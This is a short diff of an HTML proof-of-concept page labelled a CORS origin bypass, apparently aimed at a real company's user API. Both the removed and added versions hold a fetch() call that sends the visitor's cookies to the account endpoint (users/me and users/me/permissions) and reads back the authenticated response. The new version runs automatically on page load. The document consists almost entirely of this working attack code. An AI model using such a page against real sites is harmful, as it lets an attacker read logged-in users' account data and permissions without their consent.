@@ -1,25 +1,19 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h2>Origin Bypass PoC</h2>
-<button onclick="exploit()">Exploit</button>
-
+<h1>CORS Origin Bypass PoC</h1>
 <script>
-function exploit() {
-    fetch("https://learn.acronis.com/api/platform/v1/users/me/permissions", {
-        method: "GET",
-        credentials: "include", // send cookies/session
-        headers: {
-            "Origin": "https://ontechsmarthomeservices.com" // your bypass origin
-        }
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log("Sensitive Data:", data);
-        alert("Data: " + data);
-    })
-    .catch(err => console.error("Exploit failed:", err));
-}
+fetch("https://learn.acronis.com/api/platform/v1/users/me", {
+    method: "GET",
+    credentials: "include"
+})
+.then(response => response.text())
+.then(data => {
+    document.body.innerHTML += "<pre>" + data + "</pre>";
+})
+.catch(err => {
+    console.error(err);
+});
 </script>
 </body>
 </html>
